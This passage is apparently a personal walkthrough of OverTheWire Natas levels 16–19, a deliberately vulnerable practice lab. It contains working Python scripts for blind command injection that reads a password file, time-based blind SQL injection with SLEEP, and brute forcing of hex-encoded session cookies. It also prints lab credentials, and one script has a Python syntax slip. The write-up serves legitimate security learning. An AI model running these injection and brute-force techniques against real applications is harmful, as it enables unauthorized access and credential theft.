...
We can use `$()` in which we can still use any commands, and their output would be grepped. Inspired by Natas 15, I think we should try a blind boolean check here too - question is how. Something we can try and do is grep `/etc/natas_webpass/natas17` for characters and see if they exist inside, but remember we can only return a string.
Using `$(grep K /etc/natas_webpass/natas17)` returns nothing. Maybe K is in the password? Could be, so we should test what output characters that surely aren't in the password produce. Trying `?`, we'll see the entire dictionary returned! So we have a boolean rule:
> Characters that exist in the password return nothing, while characters that don't return everything.

Let's make a script that bruteforces the password using this information:
```
import requests
import string
...
headers = {
        "accept": "application/json",
        "Authorization": "Basic bmF0YXMxNjpYbTZYRWVSTjN6c0dqUkRxQlBtdXFBVlY2NWs3ZTNHYg==",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
    }
final_password = ""
i = 1
...
while i < 33:
    found = False
    for char in string.ascii_letters + string.digits:
        base_injection = f'$(grep ^{final_password}{char} /etc/natas_webpass/natas17)'
        response = requests.post("http://natas16.natas.labs.overthewire.org/", data={"needle": base_injection}, headers=headers)
        if len(response.content.decode()) < 2000:
            print(f"matched charachter {char} in position {i}")
            final_password += char
            i++
print(final_password)
```
Our tactic is this - we again iterate through the entire password length and all ASCII characters and digits, this time we check for a grep match from the beginning of the file, bruteforce a match and proceed from there, meaning each match is appended to the final password and used to grep the next character for a match. We check if a char is correct by if the response length is small (so no results), I chose 2000 randomly.
Running this, we are rewarded with `KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx`. This was a hard one!

### Natas 17
A username check form:
<img width="633" height="207" alt="image" src="https://github.com/user-attachments/assets/e7162f92-d8cc-475a-b08b-2d0d4e04a84a" /><br/>
And the source PHP code:
```
<?php
...
?>
```
We notice there's no feedback for any input as it's all commented out. Other limitations seem to match those in Natas 15 where we used `substring` to bruteforce our way like so:
```
" OR SUBSTRING((SELECT password FROM users WHERE username='natas16'),1,1)='a'--"
```
This is no use here - unless we can find a way to still indicate if a character matches or not. Knowing we can't ever return anything, something we can still measure is **response time**. I can use MySQL's `SLEEP()` command for when a character is a match, then measure if the response time is considerably longer than usual. The basic injected query is now:
```
" AND IF (BINARY SUBSTRING((SELECT password FROM users WHERE username="natas18"),{i},1)="{char}") THEN (SLEEP(1))--"
```
So the final script I wrote is this:
```
import requests
import string
...
headers = {
        "accept": "application/json",
        "Authorization": "Basic bmF0YXMxNzpLTGRBTTNWWnV4OG82VGJrYmh1YUc1S3RZakk3N3RmeA==",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
    }
final_password = ""
...
for i in range(1, 33):
    found = False
    for char in string.ascii_letters + string.digits:
        base_injection = f'" OR IF ((BINARY SUBSTRING((SELECT password FROM users WHERE username="natas18"),{i},1)="{char}"),SLEEP(5),0)--"'
        response = requests.post("http://natas17.natas.labs.overthewire.org/", data={"username": base_injection}, headers=headers)
        if response.elapsed.total_seconds() > 5:
            print(f"matched {char} in position {i}")
            final_password += char
            break
print(final_password)
```
It may take a while longer to run because we literally delay responses, but it ran smoothly and got us our next password, `fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op` :)
...
IDs are no longer sequential... But they were always random? I'm a bit confused on this. I again ran the same script from natas 18 all the way through 640 to no avail. Trying to input anything answers all of my questions:
<img width="201" height="117" alt="image" src="https://github.com/user-attachments/assets/5f097fe7-f5fb-49e7-8020-7ab50df141bc" /><br/>
We see the `PHPSESSID()` is now a pretty long string. I wanted to find out if it is indicative of anything and threw it in CyberChef and used the `Magic` operator:
<img width="952" height="194" alt="image" src="https://github.com/user-attachments/assets/d3e69b7f-52cd-4559-bacf-58cf6d4a903d" /><br/>
`506-admin` is definitely interesting - Certainly 506 isn't the session ID as I've bruteforced it earlier. Submitting a new form netted the hexed string `309-admin`. So now I know how I must modify my former script:
```
import requests
import string
...
for i in range(1, 641):
    hexed = f'{i}-admin'.encode().hex()
    base_injection = f'PHPSESSID={hexed}'
    headers = {
        "accept": "application/json",
        "Authorization": "Basic bmF0YXMxOTpxdnd0TXFBY1ZTQmxmN0hFM3N3OXBsamhxcVBGOU1NVA==",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36",
        "Cookie": base_injection
    }
    response = requests.post("http://natas19.natas.labs.overthewire.org/", data={"username":"admin", "password":"potaot"}, headers=headers)
    print(f"Trying ID {i} {response}")
    if "You are an admin." in response.content.decode():
        print(response.content.decode())
        break

```
Now we just hex the ID with the string `-admin` and send it as the cookie value. Bruteforcing it gets us to ID 281:
```
You are an admin. The credentials for the next level are:<br><pre>Username: natas20
Password: slOKYGsjlJhaqKliGvrgWAzln0JyrWao</pre>
```
Voila - `slOKYGsjlJhaqKliGvrgWAzln0JyrWao`! Another 10 done!

### Summary
Challenges 10-19 were definitely a step up from the earlier ones. Kinda intrigued at what's waiting for us in the next ones - I'll write about them in a separate article :)
